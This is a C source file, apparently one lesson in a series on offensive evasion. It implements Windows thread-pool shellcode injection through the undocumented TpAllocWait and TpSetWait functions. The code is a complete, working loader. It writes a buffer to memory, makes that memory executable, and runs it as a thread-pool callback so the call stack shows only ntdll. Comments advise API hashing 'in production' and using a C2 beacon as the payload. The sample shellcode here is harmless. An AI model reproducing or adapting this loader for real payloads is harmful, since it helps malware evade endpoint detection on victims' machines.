/*
 * 14_threadpool_injection.c
 * ==========================
 * ThreadPool Injection via TpAllocWait / TpSetWait
 *
 * This is one of the most modern and evasive execution techniques.
 * Instead of creating threads or using APCs, we register the shellcode
 * as a callback of the Windows Thread Pool.
 *
 * The Thread Pool is a native Windows mechanism that manages
 * a set of worker threads. Programs register "work items"
 * (tasks) and the pool executes them when possible.
 *
 * TpAllocWait creates a "wait object" - an item that waits for an
 * event. When the event is signaled, the threadpool executes the callback.
 * If the callback is our shellcode... bingo.
 *
 * Resulting call stack:
 *   ntdll.dll!TppWorkerThread
 *   ntdll.dll!TppWaitpExecuteCallback
 *   our_shellcode
 *
 * The call stack is 100% ntdll - pool threads are completely
 * legitimate. No CreateThread, no APC, nothing suspicious.
 *
 * This technique is used by Tartarus-TpAllocInject (Nettitude)
 * and by various modern C2 loaders.
 *
 * Compile: cl.exe /O2 14_threadpool_injection.c ntdll.lib
 */

#include <windows.h>
#include <stdio.h>

/*
 * Type definitions and internal ntdll.dll functions
 *
 * TpAllocWait and TpSetWait are not officially documented.
 * They are part of the internal Thread Pool infrastructure.
 * We need to declare the prototypes manually.
 *
 * NTSTATUS = return type (0 = success)
 * PTP_WAIT = pointer to a threadpool "wait object"
 * PTP_WAIT_CALLBACK = prototype of the callback that will be called
 */

/*
 * PTP_WAIT_CALLBACK: function called when the wait is signaled.
 *
 * Parameters the threadpool passes to the callback:
 *   Instance    -> callback instance context
 *   Context     -> pointer provided by us (we ignore it)
 *   Wait        -> the wait object that fired
 *   WaitResult  -> wait result (timeout, signaled, etc)
 *
 * Our shellcode ignores all of this and simply executes.
 */
typedef VOID (NTAPI* PTP_WAIT_CALLBACK)(
    PVOID Instance,
    PVOID Context,
    PVOID Wait,
    ULONG WaitResult
);

/* TpAllocWait - Creates a wait object in the threadpool */
typedef NTSTATUS (NTAPI* fnTpAllocWait)(
    PVOID* WaitObject,           /* receives the created wait object */
    PTP_WAIT_CALLBACK Callback,  /* function to call (our shellcode) */
    PVOID Context,               /* parameter for the callback */
    PVOID CallbackEnviron        /* callback environment (NULL = default) */
);

/* TpSetWait - Associates the wait object with an event */
typedef VOID (NTAPI* fnTpSetWait)(
    PVOID WaitObject,   /* wait object created by TpAllocWait */
    HANDLE Event,       /* event to wait for */
    PVOID Timeout       /* timeout (NULL = no timeout) */
);

/* TpReleaseWait - Releases the wait object */
typedef VOID (NTAPI* fnTpReleaseWait)(
    PVOID WaitObject
);


int main() {

    printf("[*] ThreadPool Injection via TpAllocWait\n");
    printf("[*] ======================================\n\n");

    /* ---------------------------------------------------------------
     * STEP 1: Resolve ntdll functions
     *
     * TpAllocWait, TpSetWait and TpReleaseWait are not in the
     * normal import table. We resolve them manually via GetProcAddress.
     *
     * In production: use API hashing (example 10) to avoid having
     * the "TpAllocWait" strings in the binary.
     * --------------------------------------------------------------- */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    fnTpAllocWait pTpAllocWait = (fnTpAllocWait)GetProcAddress(hNtdll, "TpAllocWait");
    fnTpSetWait pTpSetWait = (fnTpSetWait)GetProcAddress(hNtdll, "TpSetWait");
    fnTpReleaseWait pTpReleaseWait = (fnTpReleaseWait)GetProcAddress(hNtdll, "TpReleaseWait");

    if (!pTpAllocWait || !pTpSetWait) {
        printf("[!] Failed to resolve ThreadPool functions\n");
        return 1;
    }

    printf("[+] TpAllocWait:   0x%p\n", pTpAllocWait);
    printf("[+] TpSetWait:     0x%p\n", pTpSetWait);

    /* ---------------------------------------------------------------
     * STEP 2: Prepare shellcode in memory
     * --------------------------------------------------------------- */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,  /* NOP NOP NOP NOP */
        0xC3                      /* RET - returns to the threadpool */
    };

    /* Allocate RW memory */
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));

    /* Change to RX */
    DWORD old;
    VirtualProtect(exec, sizeof(shellcode), PAGE_EXECUTE_READ, &old);

    printf("[+] Shellcode prepared at: 0x%p\n", exec);

    /* ---------------------------------------------------------------
     * STEP 3: Create an already-signaled event
     *
     * CreateEvent creates an "event object" - a Windows
     * synchronization mechanism. Events can be:
     *   - Signaled: whoever waits on it is released
     *   - Non-signaled: whoever waits is blocked
     *
     * We create the event ALREADY SIGNALED (TRUE for the 3rd parameter).
     * This way, when we associate the wait object with this event,
     * the callback executes IMMEDIATELY (no waiting needed).
     *
     * TRUE (bInitialState) = event starts signaled
     * TRUE (bManualReset)  = manual reset (doesn't auto-reset)
     * --------------------------------------------------------------- */
    HANDLE hEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
    if (!hEvent) {
        printf("[!] Failed to create event\n");
        return 1;
    }
    printf("[+] Event created (already signaled)\n");

    /* ---------------------------------------------------------------
     * STEP 4: Create wait object with shellcode as callback
     *
     * TpAllocWait creates a "wait object" in the threadpool.
     * The callback (second parameter) is the function that will be called
     * when the associated event is signaled.
     *
     * We pass our shellcode address as the callback.
     * The threadpool will call our shellcode when the event fires.
     * --------------------------------------------------------------- */
    PVOID waitObject = NULL;

    NTSTATUS status = pTpAllocWait(
        &waitObject,
        (PTP_WAIT_CALLBACK)exec,  /* OUR SHELLCODE as callback */
        NULL,                      /* no extra context */
        NULL                       /* default environment */
    );

    if (status != 0) {
        printf("[!] TpAllocWait failed: 0x%08X\n", status);
        return 1;
    }
    printf("[+] Wait object created\n");

    /* ---------------------------------------------------------------
     * STEP 5: Associate wait object with the signaled event
     *
     * TpSetWait connects the wait object to the event.
     * Since the event is ALREADY signaled, the threadpool will
     * execute the callback (shellcode) at the next opportunity.
     *
     * NULL as timeout = no timeout (wait indefinitely,
     * but since the event is already signaled, it executes immediately).
     * --------------------------------------------------------------- */
    pTpSetWait(waitObject, hEvent, NULL);

    printf("[+] Wait associated with event. Callback will be executed...\n");
    printf("[*] Call stack will show: ntdll!TppWorkerThread -> callback\n");

    /* ---------------------------------------------------------------
     * STEP 6: Wait for execution
     *
     * The threadpool executes the callback on one of its worker threads.
     * We give time for the callback to execute and return.
     *
     * In production with real shellcode (beacon), the shellcode doesn't return -
     * it keeps running (checking in with the C2). In that case you wouldn't
     * need Sleep, just WaitForSingleObject on the event.
     * --------------------------------------------------------------- */
    Sleep(2000);

    printf("[+] Callback executed!\n\n");
    printf("[*] Advantages of this technique:\n");
    printf("    - Zero CreateThread / CreateRemoteThread\n");
    printf("    - Zero QueueUserAPC\n");
    printf("    - Call stack 100%% ntdll (pool thread)\n");
    printf("    - Execution looks like legitimate event-driven code\n");
    printf("    - Works with indirect syscalls (TpAllocWait via ntdll)\n");

    /* Cleanup */
    if (pTpReleaseWait && waitObject)
        pTpReleaseWait(waitObject);
    CloseHandle(hEvent);
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
